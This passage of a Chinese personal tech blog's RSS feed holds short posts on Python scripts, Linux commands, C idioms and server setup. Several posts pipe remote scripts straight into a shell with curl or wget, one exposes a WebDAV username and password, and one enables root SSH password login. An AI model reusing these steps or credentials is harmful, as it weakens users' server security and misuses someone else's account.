    params = {'username': username}&#13;
    try:&#13;
        response = requests.get(url, headers=HEADERS, params=params)&#13;
        response.raise_for_status()&#13;
        users = response.json()&#13;
        if users:&#13;
            return users[0]['id']&#13;
        else:&#13;
            logging.error(f'未找到用户名 {username} 对应的用户。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/gitlab%20-pi-liang-dao-chu-mr-ji-lu.html</guid><pubDate>Fri, 27 Dec 2024 07:57:12 +0000</pubDate></item><item><title>Github上热门 C 语言项目汇总

</title><link>https://tangrenbin.github.io/post/Github-shang-re-men-%20C%20-yu-yan-xiang-mu-hui-zong---.html</link><description>[Github上热门 C 语言项目汇总](https://mp.weixin.qq.com/s/a9PvRgriDJ_E17hvX82EVQ)。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Github-shang-re-men-%20C%20-yu-yan-xiang-mu-hui-zong---.html</guid><pubDate>Wed, 07 Aug 2024 05:07:29 +0000</pubDate></item><item><title>Python 批量计算两个不同格式时间戳之间的差异</title><link>https://tangrenbin.github.io/post/Python%20-pi-liang-ji-suan-liang-ge-bu-tong-ge-shi-shi-jian-chuo-zhi-jian-de-cha-yi.html</link><description>```python&#13;
from datetime import datetime&#13;
&#13;
# Define the timestamps as strings&#13;
timestamps = [&#13;
    ('20240805 09:51:14:177', '24-8-5  9:51:7'),&#13;
    ('20240805 09:55:31:281', '24-8-5  9:55:25'),&#13;
    ('20240805 10:01:31:451', '24-8-5  10:1:25'),&#13;
    ('20240805 10:01:32:289', '24-8-5  10:1:25'),&#13;
    ('20240805 10:10:31:368', '24-8-5  10:10:25'),&#13;
    ('20240805 10:10:32:310', '24-8-5  10:10:25'),&#13;
    ('20240805 10:16:31:441', '24-8-5  10:16:25'),&#13;
    ('20240805 10:25:31:462', '24-8-5  10:22:35'),&#13;
    ('20240805 10:25:32:368', '24-8-5  10:22:35'),&#13;
    ('20240805 10:28:21:457', '24-8-5  10:25:25'),&#13;
    ('20240805 10:31:21:541', '24-8-5  10:28:25'),&#13;
    ('20240805 10:31:22:504', '24-8-5  10:28:25'),&#13;
    ('20240805 10:43:21:562', '24-8-5  10:40:25'),&#13;
    ('20240805 10:43:22:439', '24-8-5  10:40:25'),&#13;
    ('20240805 10:49:21:690', '24-8-5  10:46:25')&#13;
]&#13;
&#13;
# Parse and calculate differences&#13;
differences = []&#13;
for ts1, ts2 in timestamps:&#13;
    # Parse the timestamps&#13;
    dt1 = datetime.strptime(ts1, '%Y%m%d %H:%M:%S:%f')&#13;
    dt2 = datetime.strptime(ts2.replace(' ', ''), '%y-%m-%d%H:%M:%S')&#13;
    &#13;
    # Calculate the difference&#13;
    diff = dt1 - dt2&#13;
    &#13;
    # Store the difference&#13;
    differences.append(diff.total_seconds())&#13;
&#13;
# Print the differences&#13;
for i, diff in enumerate(differences):&#13;
    print(f'Difference {i+1}: {diff} seconds')&#13;
```&#13;
。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Python%20-pi-liang-ji-suan-liang-ge-bu-tong-ge-shi-shi-jian-chuo-zhi-jian-de-cha-yi.html</guid><pubDate>Mon, 05 Aug 2024 03:25:41 +0000</pubDate></item><item><title>Linux 常用命令</title><link>https://tangrenbin.github.io/post/Linux%20-chang-yong-ming-ling.html</link><description># 查看当前系统运行时长&#13;
```shell&#13;
uptime -p&#13;
```&#13;
&#13;
# 查看最后一次启动时间&#13;
```shell&#13;
who -b&#13;
```&#13;
&#13;
# 查看重启日期&#13;
```shell&#13;
last -x reboot&#13;
```&#13;
&#13;
# 查看最后 N 次重启日期&#13;
```shell&#13;
last -x reboot | head -n&#13;
```&#13;
&#13;
# 查看关机日期&#13;
```shell&#13;
last -x shutdown&#13;
```&#13;
&#13;
# 查看最后 N 次关机日期&#13;
```shell&#13;
last -x shutdown | head -n&#13;
```&#13;
&#13;
# 创建闹钟任务&#13;
```&#13;
命令：crontab -e&#13;
名称：cron 表达式&#13;
解释：在一个 cron 表达式中，前面的五个字段表示时间参数，分别是分钟、小时、月份中的日期、月份、星期几。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Linux%20-chang-yong-ming-ling.html</guid><pubDate>Thu, 25 Jul 2024 03:07:43 +0000</pubDate></item><item><title>中国程序员容易发音错误的单词</title><link>https://tangrenbin.github.io/post/zhong-guo-cheng-xu-yuan-rong-yi-fa-yin-cuo-wu-de-dan-ci.html</link><description>[中国程序员容易发音错误的单词](https://fengyuanchen.github.io/chinese-programmer-wrong-pronunciation/)。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/zhong-guo-cheng-xu-yuan-rong-yi-fa-yin-cuo-wu-de-dan-ci.html</guid><pubDate>Wed, 24 Jul 2024 04:23:49 +0000</pubDate></item><item><title>alist-tvbox 服务器配置</title><link>https://tangrenbin.github.io/post/alist-tvbox%20-fu-wu-qi-pei-zhi.html</link><description># 示例&#13;
&#13;
![image](https://github.com/user-attachments/assets/12d8639b-79c9-45cf-a2fa-c0e030ee7cac)&#13;
&#13;
# 协议类型&#13;
```&#13;
WebDAV&#13;
```&#13;
# 主机&#13;
```&#13;
aws.tangrenbin.eu.org（推荐）&#13;
aws1.tangrenbin.eu.org（推荐）&#13;
arm.tangrenbin.link（即将过期）&#13;
aws.tangrenbin.link（即将过期）&#13;
```&#13;
# 端口&#13;
```&#13;
801&#13;
```&#13;
# 用户名&#13;
```&#13;
qianyu&#13;
```&#13;
# 密码&#13;
```&#13;
Qian-yu520&#13;
```&#13;
# 路径&#13;
```&#13;
dav&#13;
```&#13;
&#13;
# alist-tvbox安装&#13;
&#13;
[官方指导文档](https://github.com/power721/alist-tvbox/blob/master/doc/README_zh.md)&#13;
&#13;
## 安装命令&#13;
```shell&#13;
wget https://d.har01d.cn/update_xiaoya.sh -O update_xiaoya.sh &amp;&amp; bash ./update_xiaoya.sh -s /home/alist 800 801&#13;
```&#13;
## 端口说明&#13;
&#13;
-  4567-800 : 管理界面端口&#13;
-  5344-801 : 小雅AList端口（挂载webdav）&#13;
&#13;
。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/alist-tvbox%20-fu-wu-qi-pei-zhi.html</guid><pubDate>Thu, 18 Jul 2024 03:40:52 +0000</pubDate></item><item><title>一键安装docker脚本</title><link>https://tangrenbin.github.io/post/yi-jian-an-zhuang-docker-jiao-ben.html</link><description># 安装&#13;
&#13;
```shell&#13;
curl -fsSL https://get.docker.com | sh &amp;&amp; ln -s /usr/libexec/docker/cli-plugins/docker-compose /usr/local/bin&#13;
```&#13;
&#13;
# docker 可视化管理面板&#13;
[dockge](https://github.com/louislam/dockge)。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/yi-jian-an-zhuang-docker-jiao-ben.html</guid><pubDate>Thu, 18 Jul 2024 02:29:32 +0000</pubDate></item><item><title>亚马逊云 Ubuntu Vps 开启 root 用户开启 ssh 密码登录踩坑</title><link>https://tangrenbin.github.io/post/ya-ma-xun-yun-%20Ubuntu%20Vps%20-kai-qi-%20root%20-yong-hu-kai-qi-%20ssh%20-mi-ma-deng-lu-cai-keng.html</link><description># ping 不通&#13;
 &#13;
&#13;
1. 新建一个安全组，开启所有流量的出站和入站，特别是要添加一个  ICMP - IPv4&#13;
&#13;
![image](https://github.com/user-attachments/assets/4a33d013-d1d2-4bba-b907-184f42b9d7fc)&#13;
&#13;
![image](https://github.com/user-attachments/assets/5aa110cc-88b0-4df7-b0ad-a89ff139aced)&#13;
&#13;
2. 先申请一个弹性ip然后绑定到实例，然后释放这个ip，达到刷新的目的&#13;
&#13;
# 开启 root 用户开启 ssh 密码登录&#13;
&#13;
&#13;
1. 在控制台登录到终端，**登录之后不要轻易关闭网页，因为可能会导致无法再次进入**&#13;
2. 切换到root用户&#13;
```shell&#13;
sudo -i&#13;
```&#13;
3. 设置 root 用户密码&#13;
```shell&#13;
passwd&#13;
```&#13;
4. 编辑sshd_config配置文件，修改 PermitRootLogin 和 PasswordAuthentication 为 yes&#13;
```shell&#13;
vim /etc/ssh/sshd_config&#13;
```&#13;
5. 查看配置文件是否生效&#13;
```shell&#13;
sshd -T | grep permitrootlogin&#13;
sshd -T | grep passwordauthentication&#13;
```&#13;
6. 如果 passwordauthentication 还是 no , 那就说明还有其他的地方把这个参数配置成了 no ,通过这个命名把那个文件找出来，并且进去这个目录把这个参数改成 yes&#13;
```shell&#13;
grep -i include /etc/ssh/sshd_config&#13;
```&#13;
![image](https://github.com/user-attachments/assets/8d5d6e0a-2e78-49cc-aa7d-ab3c889e6d28)&#13;
&#13;
7. 重启 SSH 服务来应用更改&#13;
```shell&#13;
systemctl restart ssh&#13;
```&#13;
8. 再次验证配置是否正确&#13;
```shell&#13;
sshd -T | grep passwordauthentication&#13;
```&#13;
![image](https://github.com/user-attachments/assets/5459b805-d926-42f8-a8ba-1d5892aa24a6)&#13;
&#13;
&#13;
&#13;
&#13;
。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/ya-ma-xun-yun-%20Ubuntu%20Vps%20-kai-qi-%20root%20-yong-hu-kai-qi-%20ssh%20-mi-ma-deng-lu-cai-keng.html</guid><pubDate>Wed, 17 Jul 2024 08:33:28 +0000</pubDate></item><item><title>一些待办</title><link>https://tangrenbin.github.io/post/yi-xie-dai-ban.html</link><description>- [ ] 手撕链表
- [ ] 手撕哈希表
- [ ] 双指针
- [ ] 哈夫曼编码压缩与解压
- [ ] FreeRtos从入门到放弃
- [ ] μcos从入门到放弃
- [ ] RTthread从入门到放弃
- [ ] Linux内核从入门到放弃
。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/yi-xie-dai-ban.html</guid><pubDate>Tue, 16 Jul 2024 12:34:50 +0000</pubDate></item><item><title>取余操作性能优化</title><link>https://tangrenbin.github.io/post/qu-yu-cao-zuo-xing-neng-you-hua.html</link><description>一个数&amp;(2&lt;sup&gt;n&lt;/sup&gt;-1)等价于它对2&lt;sup&gt;n&lt;/sup&gt;取余&#13;
&#13;
# 原理&#13;
保留后n个bit&#13;
&#13;
# 优化点&#13;
位运算更快。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/qu-yu-cao-zuo-xing-neng-you-hua.html</guid><pubDate>Sun, 14 Jul 2024 01:53:01 +0000</pubDate></item><item><title>C语言命令手册</title><link>https://tangrenbin.github.io/post/C-yu-yan-ming-ling-shou-ce.html</link><description>```shell
man 2 open
man 3 printf
```
2是系统调用
3是c标准库。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/C-yu-yan-ming-ling-shou-ce.html</guid><pubDate>Sun, 14 Jul 2024 01:34:03 +0000</pubDate></item><item><title>达夫设备</title><link>https://tangrenbin.github.io/post/da-fu-she-bei.html</link><description># 核心思想&#13;
&#13;
循环之前先计算一下是否需要判断，而不是类似for，循环一次判断一次&#13;
&#13;
但是现代的编译器已经可以通过循环展开的方式优化了循环&#13;
&#13;
```C&#13;
void duff_device(char *to, char *from, int count)&#13;
{&#13;
    int n = (count + 7) / 8;&#13;
&#13;
    switch (count % 8)&#13;
    {&#13;
    case 0:&#13;
        do&#13;
        {&#13;
            *to++ = *from++;&#13;
        case 7:&#13;
            *to++ = *from++;&#13;
        case 6:&#13;
            *to++ = *from++;&#13;
        case 5:&#13;
            *to++ = *from++;&#13;
        case 4:&#13;
            *to++ = *from++;&#13;
        case 3:&#13;
            *to++ = *from++;&#13;
        case 2:&#13;
            *to++ = *from++;&#13;
        case 1:&#13;
            *to++ = *from++;&#13;
        } while (--n &gt; 0);&#13;
    }&#13;
}&#13;
```&#13;
&#13;
[这篇博客有详细解释](https://www.cnblogs.com/yffq/p/4558696.html)。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/da-fu-she-bei.html</guid><pubDate>Thu, 11 Jul 2024 03:47:01 +0000</pubDate></item><item><title> 取消全部打印并不编译</title><link>https://tangrenbin.github.io/post/%20-qu-xiao-quan-bu-da-yin-bing-bu-bian-yi.html</link><description>```C
#define app_printf(fmt, arg...)   ({ (void)0; }) //适用于更复杂的语法，例如三元运算符
#define app_printf(...)
#define printf_s(...)      do {} while(0)
```。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/%20-qu-xiao-quan-bu-da-yin-bing-bu-bian-yi.html</guid><pubDate>Thu, 11 Jul 2024 02:42:33 +0000</pubDate></item><item><title>GCC 取消定义但未使用变量警告</title><link>https://tangrenbin.github.io/post/GCC%20-qu-xiao-ding-yi-dan-wei-shi-yong-bian-liang-jing-gao.html</link><description>```GCC&#13;
-Wno-unused-variable -Wno-unused-but-set-variable&#13;
```。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/GCC%20-qu-xiao-ding-yi-dan-wei-shi-yong-bian-liang-jing-gao.html</guid><pubDate>Thu, 11 Jul 2024 02:17:16 +0000</pubDate></item></channel></rss>